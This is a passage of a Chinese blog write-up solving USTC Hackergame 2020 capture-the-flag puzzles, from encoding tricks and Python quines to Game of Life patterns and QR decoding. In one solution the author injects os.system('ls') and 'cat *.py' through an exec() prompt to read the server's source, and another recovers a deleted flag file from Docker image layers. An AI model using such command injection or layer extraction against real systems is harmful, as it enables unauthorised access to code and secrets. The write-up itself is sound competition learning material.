<span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 